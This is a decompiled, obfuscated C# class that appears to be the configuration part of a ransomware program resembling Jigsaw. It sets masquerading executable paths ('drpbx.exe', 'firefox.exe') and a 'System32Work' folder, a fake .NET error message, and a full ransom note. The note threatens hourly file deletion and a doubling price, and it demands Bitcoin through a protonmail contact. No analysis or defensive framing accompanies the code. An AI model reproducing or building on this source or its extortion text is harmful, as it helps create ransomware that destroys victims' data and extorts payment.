using System;
using System.IO;

namespace ns0;

internal static class Class2
{
	internal enum Enum0
	{
		const_0,
		const_1,
		const_2,
		const_3
	}

	internal static string string_0;

	internal static string string_1;

	internal static string string_2;

	internal static string string_3;

	internal static int int_0;

	internal static string string_4;

	internal static Enum0 enum0_0;

	internal static string string_5;

	internal static string string_6;

	internal static Class11.Enum1 enum1_0;

	internal static string string_7;

	internal static string string_8;

	internal static string string_9;

	internal static string string_10;

	internal static string string_11;

	internal static string string_12;

	internal static bool bool_0;

	internal static DateTime dateTime_0;

	internal static bool bool_1;

	internal static int int_1;

	internal static string string_13;

	internal static string string_14;

	internal static int int_2;

	static Class2()
	{
		bool_1 = false;
		int_1 = 6000;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		enum0_0 = Enum0.const_1;
		dateTime_0 = new DateTime(2016, 1, 1);
		string_5 = "To run this application, you first must install one of the following version of the .NET Framework:" + Environment.NewLine + ".NET Framework, Version = 4.5.1";
		string_6 = ".NET Framework Initialization Error";
		enum1_0 = Class11.Enum1.const_1;
		string_7 = "Drpbx\\drpbx.exe";
		string_9 = "Frfx\\firefox.exe";
		string_10 = Path.Combine(folderPath, string_9);
		string_8 = Path.Combine(folderPath2, string_7);
		string_11 = "System32Work\\";
		string_12 = Path.Combine(folderPath, string_11);
		if (!Directory.Exists(string_12))
		{
			Directory.CreateDirectory(string_12);
		}
		bool_0 = false;
		string_13 = "All Your Files Has Been Locked!" + Environment.NewLine + "Your personal files are being deleted. Your photos, videos, documents, etc..." + Environment.NewLine + "But All of your files were protected by a strong encryption." + Environment.NewLine + "This means that we can decrypt all your files after paying the ransom." + Environment.NewLine + Environment.NewLine + "Every hour I select some of them to delete permanently," + Environment.NewLine + "You Have 1day to Decide to Pay." + Environment.NewLine + "after 1 Day Decryption Price will Be Double." + Environment.NewLine + "During the first 24 hour you will only lose a few files," + Environment.NewLine + "the second day a few hundred, the third day a few thousand, and so on." + Environment.NewLine + "If you turn off your computer or try to close me, when I start next time" + Environment.NewLine + Environment.NewLine + "you will get 5 files deleted as a punishment." + Environment.NewLine + "If you want to unlock your data" + Environment.NewLine + "You Can Learn Decrypt Instructions" + Environment.NewLine + "click on the button: HOW TO DECRYPT FILES ?" + Environment.NewLine + Environment.NewLine + "       Contact us : zemblax@protonmail.com       ";
		int_2 = 50;
		string_14 = "Please, send at least $" + int_2 + " worth of Bitcoin here:";
	}
}
